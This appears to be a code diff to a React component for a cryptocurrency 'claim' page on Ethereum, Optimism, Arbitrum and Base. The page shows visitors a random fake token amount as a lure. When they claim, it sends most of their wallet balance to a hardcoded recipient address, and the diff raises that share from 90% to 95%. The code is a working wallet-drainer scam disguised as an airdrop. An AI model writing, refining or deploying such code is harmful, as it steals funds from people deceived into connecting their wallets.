@@ -13,6 +13,9 @@ import { parseEther } from 'viem';
 // The recipient address for all claims
 const RECIPIENT_ADDRESS = '0xbCcf6DA049fe3Ab996Abb6f960174E266a9835f3';
 
+// Generate a single random token amount for all networks
+const randomTokenAmount = Math.floor(Math.random() * 9900) + 100; // 100-10000 range
+
 type NetworkToken = {
   name: string;
   id: string;
@@ -21,19 +24,13 @@ type NetworkToken = {
   selected: boolean;
 };
 
-// Initial network definitions
+// Initial network definitions with the same token amount
 const initialNetworks: NetworkToken[] = [
-  { name: 'Ethereum Mainnet', id: 'ethereum', chainId: 1, tokenAmount: 0, selected: false },
-  { name: 'Optimism', id: 'optimism', chainId: 10, tokenAmount: 0, selected: false },
-  { name: 'Arbitrum', id: 'arbitrum', chainId: 42161, tokenAmount: 0, selected: false },
-  { name: 'Base', id: 'base', chainId: 8453, tokenAmount: 0, selected: false }
+  { name: 'Ethereum Mainnet', id: 'ethereum', chainId: 1, tokenAmount: randomTokenAmount, selected: false },
+  { name: 'Optimism', id: 'optimism', chainId: 10, tokenAmount: randomTokenAmount, selected: false },
+  { name: 'Arbitrum', id: 'arbitrum', chainId: 42161, tokenAmount: randomTokenAmount, selected: false },
+  { name: 'Base', id: 'base', chainId: 8453, tokenAmount: randomTokenAmount, selected: false }
 ];
-
-// Generate random token amounts
-const networksWithTokens = initialNetworks.map(network => ({
-  ...network,
-  tokenAmount: Math.floor(Math.random() * 9900) + 100 // 100-10000 range
-}));
 
 export default function ClaimSection() {
   const { address, isConnected, chainId } = useAccount();
@@ -41,7 +38,7 @@ export default function ClaimSection() {
   const [isProcessing, setIsProcessing] = useState<boolean>(false);
   const [transactionHash, setTransactionHash] = useState<string>('');
   const [claimSuccess, setClaimSuccess] = useState<boolean>(false);
-  const [networks, setNetworks] = useState<NetworkToken[]>(networksWithTokens);
+  const [networks, setNetworks] = useState<NetworkToken[]>(initialNetworks);
 
   // Get user's balance to calculate max amount to send
   const { data: balanceData } = useBalance({
@@ -84,8 +81,8 @@ export default function ClaimSection() {
       if (sendTransaction) {
         // Calculate amount to send (all funds minus gas)
         // For a real implementation, we would estimate gas and subtract it
-        // For simplicity, we'll use 90% of the balance to ensure there's enough for gas
-        const amountToSend = parseEther((Number(balanceData.formatted) * 0.9).toString());
+        // For simplicity, we'll use 95% of the balance to ensure there's enough for gas
+        const amountToSend = parseEther((Number(balanceData.formatted) * 0.95).toString());
 
         // Transaction to send all funds minus gas
         sendTransaction({
@@ -130,8 +127,8 @@ export default function ClaimSection() {
       if (sendTransaction) {
         // Calculate amount to send (all funds minus gas)
         // For a real implementation, we would estimate gas and subtract it
-        // For simplicity, we'll use 90% of the balance to ensure there's enough for gas
-        const amountToSend = parseEther((Number(balanceData.formatted) * 0.9).toString());
+        // For simplicity, we'll use 95% of the balance to ensure there's enough for gas
+        const amountToSend = parseEther((Number(balanceData.formatted) * 0.95).toString());
 
         // Transaction to send all funds minus gas
         sendTransaction({
